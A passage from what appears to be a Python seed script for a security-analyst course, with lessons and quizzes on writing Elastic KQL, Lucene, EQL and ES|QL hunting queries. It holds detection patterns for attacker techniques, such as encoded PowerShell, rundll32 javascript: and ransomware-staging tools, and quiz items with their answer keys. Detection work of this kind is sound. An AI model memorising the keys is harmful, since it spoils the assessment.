Switch in Discover via the *KQL / Lucene* toggle next to the search bar. Predicates KQL doesn't (cleanly) expose:

```text
// Anchored regex
process.name:/^power.*\\.exe$/

// Character classes
process.command_line:/[A-Za-z0-9+/]{200,}={0,2}/    // base64-shape

// Fuzzy match (edit distance ≤ 2)
process.name:powershel~2

// Proximity (terms within 5 positions in a phrase)
"powershell encoded"~5

// Boost — rarely useful in hunting
event.action:process_started^2

// Legacy exists / missing
_exists_:process.command_line
_missing_:process.command_line
```

Lucene's null-quirk: `_exists_:` and `_missing_:` still work in Lucene mode but the KQL idiom (`field: *` / `not field: *`) is preferred outside Lucene queries.

## Worked KQL — three iterations on the same hunt

Hunt: *PowerShell with encoded command launched by an Office process.*

**Q1 — broad:**

```kql
event.category: process
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-enc* or *EncodedCommand* or *FromBase64String*)
```

**Q2 — narrowed (Office parent):**

```kql
event.category: process
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-enc* or *EncodedCommand* or *FromBase64String*)
  and process.parent.name: ("WINWORD.EXE" or "EXCEL.EXE" or "POWERPNT.EXE" or "OUTLOOK.EXE")
```

**Q3 — exclude known-good admin paths:**

```kql
event.category: process
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-enc* or *EncodedCommand* or *FromBase64String*)
  and process.parent.name: ("WINWORD.EXE" or "EXCEL.EXE" or "POWERPNT.EXE" or "OUTLOOK.EXE")
  and not user.name: ("svc_*" or "admin_*")
```

Each iteration adds *structural* exclusions (parent process, account class), never *content* exclusions (string length, char-set). The four-element hypothesis is preserved end-to-end.

## Glossary

- **`keyword` vs `text` mapping** — ECS exposes both for many fields; pick the right one. `keyword` is exact-match case-sensitive; `text` is analyzer-tokenised case-insensitive.
- **`nested:{...}` scope** — enforces same-element matching across predicates on `nested`-mapped fields.
- **Leading-wildcard trap** — `*foo*` on a text field forces full-table scan.
- **KQL is filter-only** — no aggregation, joins, conditionals, sequence.

## Further reading

- Elastic docs — *Kibana Query Language* (`elastic.co/guide/en/kibana/current/kuery-query.html`).
- Elastic docs — *query-string query* (Lucene reference).
- ECS field reference — `elastic.co/guide/en/ecs/current/ecs-field-reference.html`.
""",
    )
    m2l2q = _add_lesson(
        session, mod2, order=4, title="KQL & Lucene — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the case-sensitivity trap, leading-wildcard performance, the nested-field same-element issue, and Lucene's regex/fuzzy reach.",
    )
    _add_q(session, m2l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 runs a KQL search `process.command_line: \"powershell\"` and gets *zero* hits, despite knowing PowerShell ran on the host. The mapping shows `process.command_line` is a `keyword` field with a `.text` multi-field. What's the most likely cause?",
        options=[
            {"value": "perm", "label": "The L2 lacks index permissions"},
            {"value": "case", "label": "Keyword fields are exact-match case-sensitive — the actual command line was `powershell.exe -enc ...`, not just the literal string `powershell`. The hunt should target `process.command_line.text: \"powershell\"` (analyzer-tokenised) or `process.command_line: \"*powershell*\"` (wildcard)"},
            {"value": "retention", "label": "The data has aged out of retention"},
            {"value": "kql_off", "label": "KQL is disabled — Lucene is the only language"},
        ],
        correct="case",
        explanation_md="`keyword` fields are exact-match case-sensitive — `process.command_line: \"powershell\"` looks for a command line that *equals* the literal string `powershell` exactly, not one that contains it. The fix is either to use the `.text` multi-field (analyzer-tokenised) or to add wildcards (`\"*powershell*\"`). Knowing whether to target `process.command_line` vs `process.command_line.text` is one of the most common KQL fluency-markers.",
        points=2,
    )
    _add_q(session, m2l2q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 writes the KQL filter `email.attachments.name: \"*.docx\" and email.attachments.size > 1000000` against an index where `email.attachments` is a `nested`-mapped field. The query returns more emails than expected. What's likely going wrong, and what's the fix?",
        options=[
            {"value": "wildcard", "label": "The leading wildcard scans every document — remove the wildcard"},
            {"value": "same_element", "label": "Without explicit `nested:{...}` scope, KQL applies each predicate to *any* element of the array — so the query matches emails with *some* `.docx` attachment AND *some* attachment over 1MB, not necessarily the same one. Fix: `email.attachments:{ name: \"*.docx\" and size > 1000000 }`"},
            {"value": "perm", "label": "The L2 lacks `view_index_metadata` permission"},
            {"value": "lucene", "label": "Switch to Lucene — KQL doesn't support attachment fields"},
        ],
        correct="same_element",
        explanation_md="The `nested`-mapping same-element trap. Multiple predicates on a `nested` array without explicit `nested:{...}` scope apply to *any* element each, producing silent over-counts. Same-element semantics requires the explicit scope syntax. This is the second-most common silent-over-count failure mode in junior KQL hunts.",
        points=3,
    )
    _add_q(session, m2l2q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which Lucene-only predicates would prompt an L2 to switch from KQL into Lucene mode in Discover?",
        options=[
            {"value": "regex_anchors", "label": "Anchored regex: `process.name:/^power.*\\.exe$/`"},
            {"value": "fuzzy", "label": "Fuzzy edit-distance match: `process.name:powershel~2`"},
            {"value": "proximity", "label": "Phrase proximity: `\"powershell encoded\"~5`"},
            {"value": "field_eq", "label": "Simple field equality: `process.name: \"powershell.exe\"`"},
            {"value": "list_match", "label": "List match: `process.name: (\"powershell.exe\" or \"cmd.exe\")`"},
        ],
        correct=["regex_anchors", "fuzzy", "proximity"],
        explanation_md="Anchored regex, fuzzy, and proximity are all Lucene-only — KQL doesn't (cleanly) expose them. Field equality and list match are first-class KQL — no need to switch. The L2 reflex: stay in KQL until a regex anchor, fuzzy, or proximity predicate appears, then toggle.",
        points=3,
    )
    _add_q(session, m2l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="Leading-wildcard KQL queries on `text`-mapped fields (e.g. `process.command_line: *cmd.exe*`) are cheap because Elasticsearch indexes substrings.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Leading wildcards on `text` fields force a full-table scan — Elasticsearch's inverted index is not designed for substring search of arbitrary positions. A trailing wildcard (`process.command_line: cmd.exe*`) uses the prefix index and is fast. Anchor your wildcards to the front whenever possible.",
        points=2,
    )

    # Lesson 2.5 — EQL
    m2l3 = _add_lesson(
        session, mod2, order=5,
        title="EQL — sequence queries and behavioural chains",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Read and write basic EQL queries — event-category predicates, `where` clauses, conditions
> 2. Use EQL **`sequence`** to express adversary behavioural chains across multiple events with `by` and `with maxspan`
> 3. Distinguish EQL's `==` (keyword exact, case-sensitive) from `:` (case-insensitive *like*-with-wildcards)
> 4. Apply `until` to terminate a sequence early on a stop event
> 5. Use EQL's pipe operators (`head`, `tail`, `unique`, `sort`) for post-processing
> 6. Recognise the EQL function set — `endsWith`, `cidrMatch`, `wildcard`, `between`

## EQL's design centre

EQL was built for **security event correlation.** Its design centre is the question shape *"event A then event B then event C, on the same host, within five minutes."* It normalises around the ECS `event.category` field, so predicates read naturally: `process where ...`, `network where ...`, `file where ...`, `authentication where ...`.

EQL is a *first-class* member of Kibana Security: the Timelines surface accepts EQL queries; the EQL search API is exposed in Dev Console; EQL rule bodies are first-class detection-rule citizens; the prebuilt rule library Elastic ships uses EQL for the technique-level rules whose logic is fundamentally a behavioural chain.

## Basic shape

A simple EQL query targets one event category with a `where` clause:

```eql
process where process.name == "powershell.exe"
  and process.command_line : "*EncodedCommand*"
```

Two operators to recognise:

- **`==`** — keyword-exact equality, **case-sensitive**.
- **`:`** — case-insensitive *like* match with wildcards (`*`, `?`).

The same predicate against `process.name` (`keyword` field):

- `process.name == "powershell.exe"` — exact, case-sensitive.
- `process.name : "powershell.exe"` — case-insensitive, can use wildcards.
- `process.name : "power*"` — prefix-wildcard.

**Mixing them up is the most common EQL fluency error.** Use `==` when you know the case; use `:` when you want forgiveness or wildcards.

## Event categories

EQL's first token is the `event.category` filter. ECS-normalised categories an L2 will use:

| Category | Typical events |
|---|---|
| `process` | process started, terminated, exec'd |
| `network` | flow, connection, DNS, HTTP, TLS |
| `file` | created, modified, deleted, renamed |
| `registry` | key set, deleted (Windows) |
| `authentication` | logon success/failure, Kerberos, NTLM |
| `library` | DLL load, image load |
| `iam` | account creation, role grant, group change |
| `intrusion_detection` | IDS / Suricata alerts |
| `dns` | DNS query / response (sub-category of `network` in some indices) |
| `email` | email events (ECS 8.6+) |

The category is what makes EQL queries readable — a hunter can glance at `process where ...` versus `network where ...` and know what data plane they're scoped to.

## `sequence` — the behavioural-chain primitive

The defining EQL primitive. Syntax:

```eql
sequence [by field1, field2, ...] [with maxspan=duration]
  [ event-category-1 where condition-1 ]
  [ event-category-2 where condition-2 ]
  ...
```

Worked example — *click on a phishing URL followed by a script-host child of a browser process within 10 minutes on the same host:*

```eql
sequence by host.name with maxspan=10m
  [ network where event.action == "url_click_allowed"
              and url.domain : "*.azurewebsites.net" ]
  [ process where process.parent.name : ("msedge.exe", "chrome.exe", "firefox.exe")
              and process.name : ("powershell.exe", "cmd.exe", "mshta.exe") ]
```

Read top-to-bottom: an event matching the first predicate, then an event matching the second predicate, on the same `host.name`, within `10m`. Each `[...]` is a step. The output is one row per *complete* sequence with the joined event fields.

### Multi-key correlation

`by` accepts multiple fields:

```eql
sequence by host.name, user.name with maxspan=5m
  [ authentication where event.action == "logon-success" ]
  [ process where process.name : "rundll32.exe" and process.command_line : "*javascript:*" ]
```

This finds login → suspicious rundll32 within 5 min keyed by host *and* user.

### `until` — early termination

`until` lets you stop the sequence when a "neutralising" event fires:

```eql
sequence by host.name with maxspan=30m
  [ process where process.name : "powershell.exe" and process.command_line : "*-enc*" ]
  [ network where destination.ip != "10.0.0.0/8" ]
  until [ process where process.name : "MsMpEng.exe" ]
```

The sequence is killed if `MsMpEng.exe` (Defender) fires in the meantime — useful for excluding sequences that the EDR already neutralised.

## `sample` — unordered correlation

Like `sequence` but the steps can occur in any order within `maxspan`. Useful when temporal order doesn't matter:

```eql
sample by host.name
  [ process where process.name : "vssadmin.exe" ]
  [ process where process.name : "wbadmin.exe" ]
  [ process where process.name : "bcdedit.exe" ]
```

Finds hosts where all three ransomware-staging tools fired in any order — the T1490 chain from L1 Module 8.

## Pipe operators — post-processing

EQL's pipe operators come *after* the main query and post-process the result-set. Unlike ES|QL pipes, EQL's are limited to post-aggregation operations:

- **`head N`** — first N rows (deterministic if combined with sort).
- **`tail N`** — last N rows.
- **`unique field, ...`** — deduplicate by named fields.
- **`sort field, ...`** — order results.
- **`count by field, ...`** — simple group-and-count.
- **`filter`** — additional predicate on the result-set.

```eql
process where process.name : "powershell.exe"
  and process.command_line : "*-enc*"
| unique host.name
| sort host.name
| head 100
```

For richer aggregation, switch to ES|QL.

## Functions

EQL exposes a function set for predicate authoring. Frequent uses:

- **`endsWith(field, "value")`** — case-sensitive suffix match.
- **`startsWith(field, "value")`** — case-sensitive prefix match.
- **`wildcard(field, "pattern")`** — explicit wildcard match.
- **`concat(a, b, ...)`** — string concatenation.
- **`length(field)`** — string length.
- **`between(field, start, end, lower_inclusive, upper_inclusive)`** — range.
- **`cidrMatch(ip_field, "10.0.0.0/8", "192.168.0.0/16")`** — CIDR membership.
- **`add`, `subtract`, `multiply`, `divide`** — arithmetic.

Worked example — outbound to non-RFC1918 from a script host:

```eql
network where process.name : ("powershell.exe", "cmd.exe", "wscript.exe")
  and not cidrMatch(destination.ip,
                    "10.0.0.0/8",
                    "172.16.0.0/12",
                    "192.168.0.0/16",
                    "127.0.0.0/8",
                    "fe80::/10")
```

## Where EQL fits in the L2 toolbox

```mermaid
flowchart LR
    Hunt[Hunt question] --> Q{Is this a behavioural chain?}
    Q -- "process A then B then C, same host, within Xm" --> EQL[EQL sequence]
    Q -- "stats / counts / pivots" --> ESQL[ES&#x7C;QL]
    Q -- "single-event filter" --> KQL[KQL]
    EQL -.detection rule.-> Rule[Kibana Security<br/>EQL rule body]
```

EQL queries become EQL rule bodies in Kibana Security with no rewriting. This is the cleanest hunt-to-detection path for behavioural-chain hunts (covered in L2 Module 8).

## Glossary

- **`event.category`** — ECS field that EQL uses as its first-class predicate target (`process where ...`, `network where ...`).
- **`sequence`** — EQL's behavioural-chain primitive. `by` for keys, `with maxspan` for window.
- **`==` vs `:`** — keyword-exact case-sensitive vs case-insensitive *like*-with-wildcards.
- **`until`** — sequence-terminator; useful for excluding chains the EDR already neutralised.
- **`sample`** — unordered correlation; like `sequence` without temporal ordering.

## Further reading

- Elastic docs — *EQL syntax* (`elastic.co/guide/en/elasticsearch/reference/current/eql-syntax.html`).
- Elastic Security Labs — *Detection rules repository* — practical EQL rule corpus.
- ECS event-category reference — `elastic.co/guide/en/ecs/current/ecs-category-field-values-reference.html`.
""",
    )
    m2l3q = _add_lesson(
        session, mod2, order=6, title="EQL — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the `==` vs `:` distinction, sequence semantics, `until` use cases, and event-category predicates.",
    )
    _add_q(session, m2l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to detect *'rundll32.exe spawned by msedge.exe with `javascript:` in the command line, within 2 minutes of an outbound HTTPS connection from msedge.exe to a `*.workers.dev` Cloudflare Worker subdomain, on the same host.'* Which EQL primitive expresses this most naturally?",
        options=[
            {"value": "where_join", "label": "A single `process where ... and network where ...` predicate"},
            {"value": "sequence", "label": "A `sequence by host.name with maxspan=2m` containing two steps — one network and one process"},
            {"value": "sample", "label": "A `sample by host.name` of two events"},
            {"value": "kql", "label": "Switch to KQL — EQL doesn't handle multi-event correlation"},
        ],
        correct="sequence",
        explanation_md="`sequence by host.name with maxspan=2m` is the canonical EQL form for two-step behavioural chains keyed by host with a time window. `sample` works without ordering but loses the temporal order signal. KQL has no correlation primitive. The `where ... and ...` form would only match a single event satisfying both predicates simultaneously, which is impossible across two event categories.",
        points=2,
    )
    _add_q(session, m2l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *correct* about EQL operators and predicates?",
        options=[
            {"value": "eq_keyword", "label": "`==` is keyword-exact and case-sensitive"},
            {"value": "colon_like", "label": "`:` is case-insensitive *like*-with-wildcards"},
            {"value": "colon_regex", "label": "`:` is full regex including anchors and character classes"},
            {"value": "until_terminate", "label": "`until [event]` terminates a sequence early when the named event fires"},
            {"value": "category_first", "label": "EQL queries lead with the `event.category` (e.g. `process where ...`, `network where ...`)"},
        ],
        correct=["eq_keyword", "colon_like", "until_terminate", "category_first"],
        explanation_md="`:` is *like*-with-wildcards (`*`, `?`), not full regex — for anchored regex you'd switch to Lucene or use `wildcard()`. `==` keyword-exact-case-sensitive, `:` case-insensitive-like, `until` terminator, and event-category-first predicate are all correct EQL semantics.",
        points=3,
    )
    _add_q(session, m2l3q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for a sequence of `vssadmin → wbadmin → bcdedit` ransomware staging on a host. The order in which the three tools fire is variable — some affiliates run `bcdedit` first, others run it last. Which EQL primitive best fits?",
        options=[
            {"value": "sequence", "label": "`sequence by host.name with maxspan=10m` enforcing the listed order"},
            {"value": "sample", "label": "`sample by host.name` — finds hosts where all three events occurred in any order within `maxspan`"},
            {"value": "three_queries", "label": "Three separate KQL queries union'd together"},
            {"value": "esql", "label": "Switch to ES|QL `STATS BY host.name`"},
        ],
        correct="sample",
        explanation_md="`sample` is EQL's primitive for *unordered* multi-event correlation — the steps can occur in any order within the time window. `sequence` enforces order, which would miss affiliates that run `bcdedit` first. ES|QL `STATS BY` could count the events but loses the per-host correlation cleanly. `sample` is the textbook fit.",
        points=2,
    )
    _add_q(session, m2l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="EQL's pipe operators (`head`, `tail`, `unique`, `sort`, `count`) post-process the result-set after the main query, but EQL does *not* support full ES|QL-style pipeline composition with `EVAL` and `STATS BY` — for richer aggregation, the L2 should switch to ES|QL.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** EQL pipes are post-aggregation only — `head`, `tail`, `unique`, `sort`, `count by`, `filter`. ES|QL has full pipeline composition with `EVAL`, `STATS BY BUCKET()`, joins, enrichments. For richer aggregation in EQL, the L2's reflex is to either save the EQL output and re-query in ES|QL, or migrate the hunt entirely to ES|QL.",
        points=2,
    )

    # Lesson 2.7 — ES|QL
    m2l4 = _add_lesson(
        session, mod2, order=7,
        title="ES|QL — the piped DSL for stats, joins, and time-series",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Write ES|QL pipelines using `FROM | WHERE | EVAL | STATS BY | SORT | LIMIT | KEEP | DROP`
> 2. Use `BUCKET()` for time-bucketing and `STATS BY BUCKET(@timestamp, 1h)` as the workhorse time-series form
> 3. Apply `DISSECT` and `GROK` for runtime parsing of unstructured fields
> 4. Use `ENRICH` (via enrich policies) and `LOOKUP JOIN` (8.16+) for joins to small reference indices
> 5. Embed KQL filters inside ES|QL with `WHERE KQL("...")`
> 6. Recognise common ES|QL pitfalls — column-drop in `STATS`, default 10,000-row cap, `LIKE`-vs-`RLIKE` syntax

## ES|QL pipeline shape

```esql
FROM <index>
| WHERE <predicate>
| EVAL <computed columns>
| STATS <aggregations> BY <grouping>
| SORT <field> [ASC|DESC]
| LIMIT <n>
| KEEP <columns>
| DROP <columns>
```

Each `|` passes a *tabular result-set* forward. Strongly resembles Splunk SPL or Microsoft Kusto in shape; the L2 who has seen either will read ES|QL fluently within an hour.

## `FROM` — the data plane

```esql
FROM logs-endpoint.events.process-*
FROM logs-endpoint.events.process-*, winlogbeat-*       // multi-index
FROM cluster1:logs-*, cluster2:logs-*                    // cross-cluster
```

Index patterns support glob; multi-index queries are first-class; cross-cluster requires the cluster prefix.

## `WHERE` — predicates

Operators: `==`, `!=`, `<`, `>`, `IN`, `NOT IN`, `IS NULL`, `IS NOT NULL`, `LIKE`, `RLIKE`.

String functions: `STARTS_WITH()`, `ENDS_WITH()`, `LENGTH()`, `TO_LOWER()`, `TO_UPPER()`, `SUBSTRING()`, `REPLACE()`.

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 24h
  AND process.name == "powershell.exe"
  AND process.parent.name IN ("WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE")
  AND process.command_line LIKE "%EncodedCommand%"
```

Note: ES|QL's `LIKE` uses SQL-style `%` and `_` (not `*` and `?`); `RLIKE` accepts a real regex. Mixing this up with KQL/EQL wildcard syntax is the most common ES|QL fluency error.

### Embedded KQL — best of both

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 24h
  AND KQL("process.name: powershell.exe AND process.command_line: *FromBase64String*")
| STATS event_count = COUNT() BY host.name, BUCKET(@timestamp, 1h)
| SORT event_count DESC
```

`KQL("...")` lets the analyst write the filter half in KQL (where intellisense and field auto-complete help) and the aggregation half in ES|QL. Idiomatic for hunts that need stats over a complex KQL filter.

## `EVAL` — computed columns

```esql
FROM logs-endpoint.events.process-*
| EVAL hour_of_day = DATE_EXTRACT("HOUR_OF_DAY", @timestamp)
| EVAL cmd_lower = TO_LOWER(process.command_line)
| EVAL is_after_hours = CASE(hour_of_day < 8 OR hour_of_day > 18, true, false)
```

Date functions: `DATE_TRUNC`, `DATE_DIFF`, `DATE_PARSE`, `DATE_FORMAT`, `DATE_EXTRACT`, `BUCKET()`.

## `STATS` — group-and-aggregate

The workhorse of ES|QL. Aggregation functions: `COUNT()`, `COUNT_DISTINCT()`, `SUM()`, `AVG()`, `MIN()`, `MAX()`, `MEDIAN()`, `PERCENTILE()`, `VALUES()` (collect into array), `TOP()`.

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 7d
  AND event.category == "process"
| STATS event_count = COUNT(),
        unique_users = COUNT_DISTINCT(user.name),
        commands = VALUES(process.command_line)
  BY host.name, BUCKET(@timestamp, 1h)
| SORT event_count DESC
| LIMIT 100
```

**The column-drop trap.** `STATS` drops every column not in the `BY` clause and not aggregated. Newcomers from Kusto-style "preserve all columns" languages are surprised. If you need columns through, add them explicitly to `BY` or aggregate them with `VALUES()` / `TOP()`.

## `BUCKET()` — time-bucketing

```esql
| STATS count = COUNT() BY BUCKET(@timestamp, 1h)
| STATS count = COUNT() BY BUCKET(@timestamp, 5m)
| STATS count = COUNT() BY BUCKET(@timestamp, 1d), host.name
```

The default time-bucketing form. Combine with `STATS` for time-series, `SORT @timestamp` for chronological output.

## `DISSECT` and `GROK` — runtime parsing

When a field contains structured-but-unparsed strings (`message`, raw command lines), `DISSECT` and `GROK` extract substrings into named columns:

```esql
FROM logs-network.dns-*
| WHERE @timestamp > NOW() - 24h
| DISSECT message "Query: %{query_name} (%{query_type})"
| STATS count = COUNT() BY query_name, query_type, BUCKET(@timestamp, 1h)
```

`DISSECT` is fast and pattern-based; `GROK` is regex-based and more flexible. Use `DISSECT` first; fall back to `GROK` only when the input is irregular.

## `ENRICH` — joins to a reference index

`ENRICH` joins the pipeline to a small reference index via a pre-defined enrich policy:

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 24h AND host.os.family == "windows"
| ENRICH asset_criticality_lookup ON host.name
| WHERE asset.criticality == "tier-0"
| STATS event_count = COUNT() BY host.name, process.name
```

The enrich policy `asset_criticality_lookup` must be created in advance against a reference index keyed by `host.name`; once registered, ES|QL pipelines can `ENRICH ... ON ...` against it.

## `LOOKUP JOIN` — left-outer join to a small index (8.16+)

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 24h
| LOOKUP JOIN known_admins_lookup ON user.name
| WHERE known_admins_lookup.is_admin IS NULL
```

`LOOKUP JOIN` is the explicit left-outer-join form for cases where `ENRICH` policies aren't a fit. The right side must be a small lookup index; large-large joins remain awkward in ES|QL.

## `SORT` and `LIMIT`

```esql
| SORT event_count DESC, host.name ASC
| LIMIT 1000
```

ES|QL has a default 10,000-row result cap. For large `STATS` results, set `LIMIT` explicitly. Note that `SORT` happens *before* `LIMIT`, so `SORT event_count DESC | LIMIT 100` is "top 100 by count" — the canonical "top-N" form.

## `KEEP` and `DROP` — column projection

```esql
| KEEP @timestamp, host.name, process.command_line, event_count
| DROP fields.we.dont.want, internal.bookkeeping
```

Use `KEEP` to whitelist final columns; use `DROP` to blacklist a few from a wide table. The L2 reflex: end every pipeline with `KEEP` to make the result-set's shape obvious.

## Worked ES|QL — beaconing anomaly

A 30-day beaconing-anomaly hunt that combines `BUCKET()`, `STATS`, and a structural filter:

```esql
FROM logs-network.flow-*
| WHERE @timestamp > NOW() - 30d
  AND network.transport == "tcp"
  AND destination.port IN (443, 80)
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS connection_count = COUNT(),
        unique_destinations = COUNT_DISTINCT(destination.ip),
        bytes_total = SUM(network.bytes)
  BY host.name, destination.ip, BUCKET(@timestamp, 1h)
| WHERE connection_count > 50 AND unique_destinations == 1
| SORT connection_count DESC
| LIMIT 100
| KEEP @timestamp, host.name, destination.ip, connection_count, bytes_total
```

Reads top-to-bottom: scope to TCP/443/80 outbound to non-RFC1918, count connections per (host × IP × hour), keep buckets with >50 connections to a single destination IP, sort by count, take top 100.

## Common ES|QL pitfalls

- **`LIKE` vs `RLIKE` syntax.** `LIKE` uses `%` / `_`; `RLIKE` is regex. Mixing in KQL/EQL wildcard chars (`*`, `?`) silently fails to match.
- **Default 10,000-row cap.** Set `LIMIT` explicitly for large `STATS` results.
- **`STATS` column-drop.** Every non-`BY`, non-aggregated column is dropped. Surprising for Kusto users.
- **`@timestamp` filtering.** Always filter `@timestamp` early — unbounded time-range queries hit the full retention window and time out.
- **Embedded KQL gotchas.** `WHERE KQL("...")` runs the embedded KQL with all the KQL semantics (case sensitivity, nested-field traps); the wrapper doesn't fix them.
- **`ENRICH` policy lifecycle.** Enrich policies are *administered* (created against a source index, registered, executed); a hunter authoring an ES|QL `ENRICH` clause requires the policy already in place.

## Where ES|QL beats EQL / KQL — recap

```mermaid
flowchart LR
    A[Stats / aggregation / pivoting] --> ESQL1[ES&#x7C;QL STATS BY]
    B[Cross-index / cross-cluster] --> ESQL2[ES&#x7C;QL FROM a-*, b-*]
    C[Joins / lookups] --> ESQL3[ES&#x7C;QL ENRICH / LOOKUP JOIN]
    D[Time-bucketing] --> ESQL4[ES&#x7C;QL BUCKET]
    E[Behavioural chains] --> EQL[EQL sequence]
    F[Quick filter / search bar] --> KQL[KQL]
    G[Detection rule body] --> ER[EQL rule] & ESR[ES&#x7C;QL rule]
```

## Glossary

- **`FROM | WHERE | EVAL | STATS BY | SORT | LIMIT | KEEP | DROP`** — the ES|QL pipeline operators.
- **`BUCKET(@timestamp, 1h)`** — time-bucketing. The workhorse of ES|QL time-series.
- **`DISSECT` / `GROK`** — runtime parsing of unstructured strings.
- **`ENRICH`** — join to a reference index via an enrich policy.
- **`LOOKUP JOIN`** — left-outer join to a lookup index (8.16+).
- **`KQL("...")`** — embed a KQL predicate inside ES|QL.

## Further reading

- Elastic docs — *ES|QL reference* (`elastic.co/guide/en/elasticsearch/reference/current/esql.html`).
- Elastic docs — *ES|QL functions reference* (per-function pages).
- Elastic blog — *ES|QL GA announcement* (8.13).
""",
    )
    m2l4q = _add_lesson(
        session, mod2, order=8, title="ES|QL — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the pipeline operators, `STATS` column-drop trap, `LIKE` vs `RLIKE` syntax, and the embedded-KQL pattern.",
    )
    _add_q(session, m2l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 writes `... | STATS event_count = COUNT() BY host.name | SORT process.command_line` and the query errors with *'unknown column process.command_line'*. What is the most likely cause?",
        options=[
            {"value": "perm", "label": "Permission issue on `process.command_line`"},
            {"value": "stats_drop", "label": "`STATS` drops every column not in the `BY` clause and not aggregated — `process.command_line` was lost when STATS ran. To keep it, either add it to `BY` or aggregate it (e.g. `VALUES(process.command_line)` or `TOP(process.command_line, 1)`)"},
            {"value": "missing", "label": "The field doesn't exist in the index"},
            {"value": "syntax", "label": "Sort syntax is wrong — should be `SORT BY process.command_line`"},
        ],
        correct="stats_drop",
        explanation_md="The ES|QL `STATS` column-drop trap. After `STATS`, only the `BY` columns and the aggregated columns remain — every other column is dropped. The L2 reflex is to either add the column to `BY` (changes the grouping) or aggregate it explicitly (e.g. `VALUES(process.command_line)` to collect per-group, or `TOP(process.command_line, 1)` for the most common per group).",
        points=2,
    )
    _add_q(session, m2l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following ES|QL pipeline operations are *correctly* described?",
        options=[
            {"value": "from_multi", "label": "`FROM logs-*, winlogbeat-*` queries multiple indices in one statement"},
            {"value": "bucket", "label": "`BUCKET(@timestamp, 1h)` is the canonical ES|QL time-bucketing form, used inside `STATS ... BY`"},
            {"value": "dissect", "label": "`DISSECT message \"%{key}=%{value}\"` extracts substrings into runtime columns at query time"},
            {"value": "kql_embed", "label": "`WHERE KQL(\"process.name: powershell*\")` embeds a KQL filter inside an ES|QL pipeline"},
            {"value": "esql_sequence", "label": "`SEQUENCE BY host.name WITH MAXSPAN=5m [event1] [event2]` is ES|QL's behavioural-chain primitive"},
        ],
        correct=["from_multi", "bucket", "dissect", "kql_embed"],
        explanation_md="The trap is the last option. `sequence` is **EQL's** primitive, not ES|QL's. ES|QL has no behavioural-chain operator yet (as of 8.16) — for chains, switch to EQL. Multi-index FROM, BUCKET time-bucketing, DISSECT runtime parsing, and embedded KQL are all correct ES|QL features.",
        points=3,
    )
    _add_q(session, m2l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 writes `WHERE process.command_line LIKE \"*EncodedCommand*\"` in ES|QL and gets zero hits despite knowing the artefact is present. What's the most likely fix?",
        options=[
            {"value": "kql", "label": "Switch to KQL — ES|QL doesn't support wildcard predicates"},
            {"value": "syntax", "label": "ES|QL `LIKE` uses SQL-style `%` and `_` (not `*` and `?`); the predicate should be `LIKE \"%EncodedCommand%\"` — or use `RLIKE` for regex"},
            {"value": "case", "label": "Add `TO_LOWER()` around the field"},
            {"value": "missing", "label": "The field doesn't exist"},
        ],
        correct="syntax",
        explanation_md="ES|QL's `LIKE` uses SQL-style wildcards (`%` and `_`), not KQL/EQL-style (`*` and `?`). The predicate `LIKE \"*EncodedCommand*\"` matches command lines that *literally* contain the asterisks — almost never. Fix: `LIKE \"%EncodedCommand%\"`. For full regex use `RLIKE`. Mixing wildcard syntax across languages is the most common ES|QL fluency error.",
        points=2,
    )
    _add_q(session, m2l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Name the ES|QL clause that lets the L2 *embed a KQL predicate inside an ES|QL pipeline*, used to write the filter half of a hunt in KQL and the aggregation half in ES|QL. (Function name only.)",
        options=None,
        correct=["KQL", "kql", "KQL()", "kql()", "WHERE KQL", "where kql"],
        explanation_md="`KQL(\"...\")` — used as `WHERE KQL(\"process.name: powershell* AND process.parent.name: WINWORD.EXE\")`. The pattern is idiomatic in modern Elastic for hunts that need both KQL's intellisense-friendly filter ergonomics and ES|QL's `STATS BY BUCKET()` aggregation. The companion function `MATCH(field, \"value\")` does the same thing for full-text matches.",
        points=2,
    )

    # ── Module 3 — Process & file events: Execution + Defense Evasion ────
    mod3 = _add_module(
        session, course, order=3,
        title="Process & file events — Execution + Defense Evasion",
        description_md=(
            "First concrete-hunt module in L2. Apply the PEAK methodology "
            "of Module 1 and the KQL/EQL/ES|QL fluency of Module 2 to "
            "the **Execution (TA0002)** and **Defense Evasion (TA0005)** "
            "ATT&CK tactic families. The process-event data plane in "
            "Elastic (`logs-endpoint.events.process-*` vs `winlogbeat-*`); "
            "ECS field reference for hunters; T1059 / T1204 / T1218 / "
